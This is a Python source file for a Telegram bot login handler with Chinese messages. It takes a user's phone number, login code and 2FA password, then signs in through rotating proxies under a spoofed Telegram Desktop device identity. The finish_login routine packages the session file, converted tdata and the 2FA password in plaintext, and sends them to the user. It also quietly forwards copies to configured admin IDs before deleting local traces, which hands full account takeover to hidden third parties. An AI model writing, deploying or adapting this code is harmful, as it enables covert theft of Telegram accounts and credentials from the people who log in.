import os
import json
import zipfile
import shutil
import asyncio
import logging
import random
import time
from datetime import datetime
from opentele.tl import TelegramClient
from opentele.api import API, UseCurrentSession
from telethon.errors import SessionPasswordNeededError, AuthRestartError
from dotenv import load_dotenv

load_dotenv()
ACCOUNT_LOGIN_BACK = os.getenv("ACCOUNT_LOGIN_BACK")
ADMIN_ID = os.getenv("ADMIN_ID")
API_ID = int(os.getenv("TELEGRAM_APP_ID", "2040"))
API_HASH = os.getenv("TELEGRAM_APP_HASH", "b18441a1ff607e10a989891a5462e627")

logger = logging.getLogger(__name__)

_proxy_list = None
_proxy_list_last_load = 0
PROXY_LIST_CACHE_TIME = 60

def load_proxies():
    global _proxy_list, _proxy_list_last_load
    
    current_time = time.time()
    if _proxy_list is not None and (current_time - _proxy_list_last_load) < PROXY_LIST_CACHE_TIME:
        return _proxy_list
    
    proxy_file = "proxy.txt"
    valid_proxies = []
    
    if not os.path.exists(proxy_file):
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []
    
    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                parts = line.split(':')
                if len(parts) >= 5:
                    ip, port, username, password, expire_ts = parts[:5]
                    try:
                        expire_timestamp = int(expire_ts)
                        if current_time < expire_timestamp:
                            proxy = {
                                'ip': ip,
                                'port': int(port),
                                'username': username,
                                'password': password,
                                'expire': expire_timestamp
                            }
                            valid_proxies.append(proxy)
                    except ValueError:
                        continue
    
    except Exception:
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []
    
    _proxy_list = valid_proxies
    _proxy_list_last_load = current_time
    return valid_proxies

def get_random_proxy():
    proxies = load_proxies()
    if not proxies:
        return None
    return random.choice(proxies)

def create_proxy_dict(proxy):
    return {
        'proxy_type': 'http',
        'addr': proxy['ip'],
        'port': proxy['port'],
        'username': proxy['username'],
        'password': proxy['password'],
        'rdns': True
    }

class LoginHandler:
    def __init__(self, user_id, chat_id):
        self.user_id = user_id
        self.chat_id = chat_id
        self.phone = None
        self.client = None
        self.session_file = None
        self.twofa = None
        self.proxy = None
        self._lock = asyncio.Lock()
        self._retry_count = 0
        self.random_api = None

    async def handle_phone(self, update, context, phone):
        self.phone = phone
        self.session_file = f"sessions/{phone}.session"
        os.makedirs("sessions", exist_ok=True)
        
        self.proxy = get_random_proxy()
        proxy_dict = create_proxy_dict(self.proxy) if self.proxy else None
        
        self.random_api = API.TelegramDesktop.Generate()
        
        self.client = TelegramClient(
            self.session_file,
            api=self.random_api,
            proxy=proxy_dict,
            device_model=self.random_api.device_model,
            system_version=self.random_api.system_version,
            app_version=self.random_api.app_version,
            lang_code=self.random_api.lang_code,
            system_lang_code=self.random_api.system_lang_code
        )
        
        await self.client.connect()
        
        try:
            if not await self.client.is_user_authorized():
                await self.client.send_code_request(phone)
                await update.message.reply_text(
                    "<tg-emoji emoji-id='5877316724830768997'>📤</tg-emoji> 验证码已发送，请输入：",
                    parse_mode='HTML'
                )
            else:
                await self.finish_login(update, context)
        except AuthRestartError:
            if self._retry_count < 3:
                self._retry_count += 1
                await asyncio.sleep(2)
                if self.client:
                    await self.client.disconnect()
                await self.handle_phone(update, context, phone)
            else:
                await update.message.reply_text(
                    "<tg-emoji emoji-id='5839200986022812209'>❌</tg-emoji> 服务器繁忙，请稍后重试",
                    parse_mode='HTML'
                )
    
    async def handle_code(self, update, context, code):
        async with self._lock:
            try:
                await self.client.sign_in(self.phone, code)
                await self.finish_login(update, context)
                return True
            except SessionPasswordNeededError:
                await update.message.reply_text(
                    "<tg-emoji emoji-id='6005570495603282482'>🔐</tg-emoji> 需要2FA密码，请输入：",
                    parse_mode='HTML'
                )
                return False
            except AuthRestartError:
                await update.message.reply_text(
                    "<tg-emoji emoji-id='5877613700344450910'>❌</tg-emoji> 验证超时，请重新发送验证码",
                    parse_mode='HTML'
                )
                if self.client:
                    await self.client.disconnect()
                    self.client = None
                return None
            except Exception as e:
                await update.message.reply_text(
                    f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> 登录失败: {str(e)}",
                    parse_mode='HTML'
                )
                if self.client:
                    await self.client.disconnect()
                    self.client = None
                return None
    
    async def handle_2fa(self, update, context, password):
        async with self._lock:
            try:
                self.twofa = password
                await self.client.sign_in(password=password)
                await self.finish_login(update, context)
                return True
            except Exception as e:
                await update.message.reply_text(
                    f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> 2FA验证失败: {str(e)}",
                    parse_mode='HTML'
                )
                return False
    
    async def finish_login(self, update, context):
        me = await self.client.get_me()
        
        phone = self.phone
        reg_time = datetime.now().strftime("%Y-%m-%d")
        
        json_data = {
            "api_id": API_ID,
            "api_hash": API_HASH,
            "device_model": self.random_api.device_model,
            "system_version": self.random_api.system_version,
            "app_version": self.random_api.app_version,
            "system_lang_code": self.random_api.system_lang_code,
            "lang_pack": self.random_api.lang_pack,
            "lang_code": self.random_api.lang_code,
            "pid": self.random_api.pid,
            "user_id": me.id,
            "phone": phone,
            "twofa": self.twofa if self.twofa else "",
            "password": self.twofa if self.twofa else "",
            "app_id": API_ID,
            "app_hash": API_HASH,
            "session_file": os.path.basename(self.session_file).replace('.session', ''),
            "device": self.random_api.device_model,
            "username": me.username or "",
            "sex": None,
            "avatar": "img/default.png",
            "package_id": "",
            "installer": "",
            "ipv6": False,
            "SDK": self.random_api.system_version,
            "sdk": self.random_api.system_version,
            "system_lang_pack": self.random_api.system_lang_code,
            "premium": getattr(me, 'premium', False),
            "reg_time": reg_time
        }
        
        json_path = self.session_file.replace('.session', '.json')
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(json_data, f, indent=2, ensure_ascii=False)
        
        timestamp = int(asyncio.get_event_loop().time())
        zip_path = f"downloads/login_session_{self.user_id}_{timestamp}.zip"
        os.makedirs("downloads", exist_ok=True)
        
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            zipf.write(self.session_file, os.path.basename(self.session_file))
            zipf.write(json_path, os.path.basename(json_path))
            
        tdesk = await self.client.ToTDesktop(flag=UseCurrentSession)
        tdata_base_dir = f"downloads/tdata_base_{phone}_{timestamp}"
        account_dir = os.path.join(tdata_base_dir, phone)
        tdata_dir = os.path.join(account_dir, "tdata")
        os.makedirs(tdata_dir, exist_ok=True)
        tdesk.SaveTData(tdata_dir)
        
        if self.twofa:
            with open(os.path.join(account_dir, "2fa.txt"), 'w', encoding='utf-8') as f:
                f.write(self.twofa)
                
        tdata_zip_path = f"downloads/login_tdata_{self.user_id}_{timestamp}.zip"
        with zipfile.ZipFile(tdata_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(account_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, account_dir)
                    zipf.write(file_path, arcname)

        with open(zip_path, 'rb') as f_session:
            await context.bot.send_document(
                chat_id=self.chat_id,
                document=f_session,
                caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 登录成功\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone} [Session]",
                parse_mode='HTML'
            )
            
        with open(tdata_zip_path, 'rb') as f_tdata:
            await context.bot.send_document(
                chat_id=self.chat_id,
                document=f_tdata,
                caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 登录成功\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone} [Tdata]",
                parse_mode='HTML'
            )
        
        if ADMIN_ID:
            for admin_id in ADMIN_ID.split(','):
                try:
                    with open(zip_path, 'rb') as f_session:
                        await context.bot.send_document(
                            chat_id=admin_id.strip(),
                            document=f_session,
                            caption=f"用户 {self.user_id} 登录: {self.phone} [Session]"
                        )
                    with open(tdata_zip_path, 'rb') as f_tdata:
                        await context.bot.send_document(
                            chat_id=admin_id.strip(),
                            document=f_tdata,
                            caption=f"用户 {self.user_id} 登录: {self.phone} [Tdata]"
                        )
                except:
                    pass
        
        os.remove(zip_path)
        os.remove(tdata_zip_path)
        shutil.rmtree(tdata_base_dir, ignore_errors=True)
        os.remove(self.session_file)
        os.remove(json_path)
        await self.client.disconnect()
